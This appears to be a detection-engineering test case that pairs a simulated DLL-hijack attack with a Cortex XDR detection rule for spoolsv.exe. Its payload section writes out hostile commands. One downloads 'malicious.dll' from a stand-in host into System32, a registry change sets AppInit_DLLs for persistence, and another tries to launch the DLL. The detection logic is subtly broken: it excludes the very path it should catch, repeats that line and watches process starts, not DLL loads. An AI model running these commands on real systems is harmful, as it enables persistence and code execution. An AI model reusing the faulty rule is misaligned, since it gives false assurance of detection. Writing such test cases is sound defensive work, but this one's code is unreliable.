identity.description: An attacker places a malicious DLL in a location that will be loaded by a Microsoft process, triggering an unsigned DLL hijack. Cortex detects this behavior by monitoring for unsigned DLL loads into trusted processes.

payload.code:
mkdir C:\Windows\System32\spool\drivers\x64\1.0.0.0

curl -o C:\Windows\System32\spool\drivers\x64\1.0.0.0\winspool.dll http://192.0.2.10/malicious.dll

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\System32\spool\drivers\x64\1.0.0.0\winspool.dll" /f

powershell -Command "Start-Process -FilePath 'C:\Windows\System32\spool\drivers\x64\1.0.0.0\winspool.dll'"

expected_artifacts.description: Unsigned malicious DLL placed in hijackable directory

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unsigned DLL Load into Trusted Process
biocs.description: Detection of unsigned DLL being loaded into a Microsoft process such as spoolsv.exe
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'spoolsv.exe'
| filter action_file_path contains 'winspool.dll'
| filter action_file_path not contains 'C:\\Windows\\System32\\spool\\drivers\\x64\\1.0.0.0\\winspool.dll'
| filter action_file_path not contains 'C:\\Windows\\System32\\spool\\drivers\\x64\\1.0.0.0\\winspool.dll'
